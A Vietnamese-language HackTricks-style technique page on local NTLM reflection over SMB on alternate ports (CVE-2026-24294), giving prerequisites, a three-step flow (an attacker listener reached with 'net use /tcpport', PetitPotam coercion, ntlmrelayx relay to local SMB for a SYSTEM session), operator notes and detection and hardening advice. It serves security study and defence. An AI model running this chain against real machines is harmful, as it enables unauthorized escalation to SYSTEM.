# Local NTLM Reflection qua SMB trên cổng tùy ý

{{#include ../../banners/hacktricks-training.md}}

Các bản Windows gần đây đã bổ sung **hỗ trợ cổng TCP thay thế cho SMB client**. Tính năng này có thể bị lạm dụng để biến **xác thực NTLM cục bộ** thành **leo thang đặc quyền cục bộ lên SYSTEM** khi attacker có thể:<sup>[[1]](#references)</sup>

1. Mở kết nối SMB đến listener do attacker kiểm soát trên **cổng khác 445**
2. Duy trì kết nối TCP đó
3. Buộc một **client cục bộ có đặc quyền** truy cập **cùng đường dẫn SMB share**
4. Relay kết quả **xác thực NTLM cục bộ** trở lại dịch vụ SMB thực của máy

Đây là primitive đằng sau **CVE-2026-24294**, được vá vào **tháng 3 năm 2026**.<sup>[[1]](#references)[[4]](#references)</sup>

## Vì sao hoạt động

Thủ thuật reflection CMTI / serialized-SPN cũ được đề cập ở đây:

{{#ref}}
../ntlm/README.md
{{#endref}}

Biến thể mới này **không** cần hostname được marshal. Thay vào đó, nó lạm dụng hai hành vi của SMB client:<sup>[[1]](#references)</sup>

- **Hỗ trợ cổng thay thế** trên **Windows 11 24H2** và **Windows Server 2025**, cho phép người dùng dùng lệnh `net use \\host\share /tcpport:<port>`
- **Tái sử dụng / multiplexing kết nối SMB**, cho phép nhiều phiên đã xác thực cùng sử dụng một kết nối TCP

Điều đó có nghĩa là người dùng có đặc quyền thấp trước tiên có thể tạo kết nối TCP từ SMB client đến SMB server của attacker trên một cổng cao, sau đó buộc một dịch vụ có đặc quyền truy cập **chính xác cùng đường dẫn UNC**. Nếu Windows quyết định tái sử dụng kết nối TCP hiện có, quá trình trao đổi NTLM của tài khoản có đặc quyền sẽ được gửi qua transport do attacker kiểm soát và có thể được relay đến SMB server cục bộ.<sup>[[1]](#references)</sup>

## Điều kiện tiên quyết

- Target hỗ trợ cổng SMB thay thế:<sup>[[2]](#references)</sup>
  - **Windows 11 24H2** trở lên
  - **Windows Server 2025** trở lên
- Attacker có thể chạy SMB server cục bộ hoặc từ xa trên một cổng cao tùy chọn
- Attacker có thể buộc một dịch vụ có đặc quyền truy cập đường dẫn UNC
- Xác thực có đặc quyền phải là **xác thực NTLM cục bộ**
- Target phải có thể bị relay:<sup>[[1]](#references)</sup>
  - Synacktiv cho biết kỹ thuật này hoạt động theo mặc định trên **Windows Server 2025**
  - Chuỗi khai thác của họ **không** hoạt động trên **Windows 11 24H2** vì outbound SMB signing được bật bắt buộc theo mặc định

## Userland và internals

Từ command line, tính năng này có vẻ đơn giản:

```cmd
net use \\192.168.56.3\share /tcpport:12345
```

Về mặt lập trình, client sử dụng `WNetAddConnection4W` với dữ liệu `lpUseOptions` không được tài liệu hóa. Tùy chọn liên quan là `TraP` (các tham số truyền tải), cuối cùng được chuyển đến SMB client trong kernel thông qua một FSCTL và được `mrxsmb` phân tích.<sup>[[1]](#references)[[3]](#references)</sup>

Các lưu ý thực tế quan trọng:<sup>[[1]](#references)</sup>

- **Cú pháp UNC vẫn không có trường cổng**
- **`net use` áp dụng cho từng phiên đăng nhập**
- Cách bypass vẫn hoạt động vì **kết nối TCP và phiên SMB là các đối tượng riêng biệt**
- Bắt buộc phải dùng lại **cùng đường dẫn share** nếu exploit phụ thuộc vào việc SMB client tái sử dụng kết nối TCP đã được tạo trước đó

## Luồng khai thác

### 1. Tạo transport SMB do attacker kiểm soát

Chạy SMB server trên một cổng cao và khiến Windows kết nối đến đó:

```cmd
net use \\192.168.56.3\share /tcpport:12345
```

Máy chủ có thể chấp nhận bất kỳ cặp thông tin xác thực nào bạn kiểm soát, chẳng hạn `user:user`. Mục tiêu của bước này chưa phải là leo thang đặc quyền, mà chỉ để khiến Windows SMB client mở và duy trì một kết nối TCP có thể tái sử dụng đến listener của bạn.<sup>[[1]](#references)</sup>

### 2. Buộc một service có đặc quyền truy cập cùng UNC path

Dùng một coercion primitive như **PetitPotam** nhắm đến cùng path `\\192.168.56.3\share`. Nếu client bị ép truy cập có đặc quyền và tên đích là cục bộ (`localhost` hoặc IP/host cục bộ), Windows sẽ thực hiện **NTLM local authentication**.

Vì kết nối TCP được tái sử dụng, luồng trao đổi NTLM có đặc quyền đó sẽ đi đến SMB service của attacker thay vì trực tiếp đến SMB server cục bộ thực sự.<sup>[[1]](#references)</sup>

### 3. Relay xác thực có đặc quyền trở lại SMB cục bộ

SMB service do attacker kiểm soát chuyển tiếp luồng trao đổi NTLM có đặc quyền đến `ntlmrelayx.py`. Công cụ này relay luồng đó đến SMB listener thực sự của máy và lấy được session với quyền `NT AUTHORITY\SYSTEM`.<sup>[[1]](#references)</sup>

Các công cụ thường dùng trong bài viết công khai:<sup>[[1]](#references)</sup>

- `smbserver.py` trên một port tùy chỉnh để nhận xác thực có đặc quyền qua kết nối TCP được tái sử dụng
- `ntlmrelayx.py` để relay NTLM đã capture đến SMB cục bộ
- `PetitPotam.exe` hoặc một coercion primitive khác để buộc thực hiện xác thực có đặc quyền

## Ghi chú cho operator

- Đây là kỹ thuật **leo thang đặc quyền cục bộ**, không phải thủ thuật relay từ xa thông thường<sup>[[1]](#references)</sup>
- SMB service do attacker kiểm soát phải xử lý xác thực có đặc quyền trên **cùng kết nối TCP** ban đầu được dùng để mount share<sup>[[1]](#references)</sup>
- Nếu truy cập bị ép nhắm đến **một share path khác**, Windows có thể tạo một kết nối khác và chuỗi này sẽ bị gián đoạn<sup>[[1]](#references)</sup>
- Yêu cầu bật SMB signing có thể khiến relay thất bại ngay cả khi bước dùng port tùy ý hoạt động<sup>[[1]](#references)</sup>
- Nếu bạn chỉ có thông tin Kerberos hoặc không thể buộc local NTLM, biến thể cụ thể này sẽ không đủ<sup>[[1]](#references)</sup>

## Phát hiện và tăng cường bảo mật

- Cài bản vá **CVE-2026-24294** từ **Patch Tuesday tháng 3 năm 2026**<sup>[[4]](#references)</sup>
- Theo dõi lệnh `net use` hoặc `New-SmbMapping` sử dụng **các port SMB không mặc định**<sup>[[1]](#references)</sup>
- Cảnh báo khi workstation hoặc server có lưu lượng SMB outbound bất thường đến **các TCP port cao**<sup>[[1]](#references)</sup>
- Rà soát các cơ hội coercion như trigger kiểu **EFSRPC / PetitPotam**<sup>[[1]](#references)</sup>
- Bật SMB signing khi có thể; Synacktiv lưu ý rằng biện pháp này đã chặn relay của họ trên Windows 11 24H2<sup>[[1]](#references)</sup>

## References

- [1] [Synacktiv - Vượt qua các biện pháp giảm thiểu reflection xác thực Windows để lấy shell SYSTEM - Phần 1](https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1.html)
- [2] [Microsoft Learn - Cấu hình các port SMB thay thế cho Windows Server 2025](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ports)
- [3] [Microsoft Learn - WNetAddConnection4W](https://learn.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection4w)
- [4] [MSRC - CVE-2026-24294](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-24294)
{{#include ../../banners/hacktricks-training.md}}
